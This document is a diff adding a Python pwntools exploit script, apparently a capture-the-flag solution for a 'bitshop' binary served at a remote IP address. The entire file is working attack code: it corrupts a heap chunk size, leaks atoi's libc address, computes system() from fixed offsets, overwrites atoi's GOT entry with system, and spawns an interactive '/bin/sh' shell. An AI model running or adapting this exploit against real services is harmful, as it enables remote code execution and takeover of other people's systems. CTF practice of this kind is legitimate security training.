@@ -1,0 +1,60 @@
+from pwn import *
+from pprint import pprint
+def add(n):
+    p.sendline('1')
+    p.recvuntil(':')
+    p.sendline(str(n))
+    p.recvuntil(':')
+    p.sendline(p64(0x100) * ((n/8)-1))
+    p.recvuntil(':')
+    p.sendline('b' * 58)
+    p.recvuntil('$')
+def free(id):
+    p.sendline('3')
+    p.recvuntil(':')
+    p.sendline(str(id))
+    p.recvuntil('$')
+#p=process('./bitshop')
+p=remote('101.200.187.112',9002)
+atoi=0x602088
+offset_atoi = 0x0000000000039f50
+offset_system = 0x0000000000046640
+p.recvuntil('name:')
+p.sendline('nonick')
+p.recvuntil('$')
+add(128)
+add(512)
+#raw_input()
+#modify first chunk size
+p.sendline('4')
+p.recvuntil(':')
+p.sendline('c'*100+p64(0x211))
+p.recv()
+#Add a new comment
+p.sendline('2')
+p.recvuntil(':')
+p.sendline('0')
+p.recvuntil(':')
+p.sendline('512')
+p.recvuntil(':')
+p.sendline('x'*0x90+p64(atoi)+p32(0x7fffffff)+'newname')
+p.recvuntil('$')
+p.sendline('5')
+p.recvuntil('Comment : ')
+data=u64(p.recvuntil('\x7f').ljust(8,'\x00'))
+print 'atoi: '+hex(data)
+system=data-offset_atoi+offset_system
+print 'system: '+hex(system)
+p.recvuntil('$')
+#overwrite atoi
+#raw_input()
+p.sendline('2')
+p.recvuntil(':')
+p.sendline('0')
+p.recvuntil(':')
+p.sendline('512')
+p.recvuntil(':')
+p.sendline(p64(system))
+p.recvuntil('$')
+p.sendline('/bin/sh\x00')
+p.interactive()
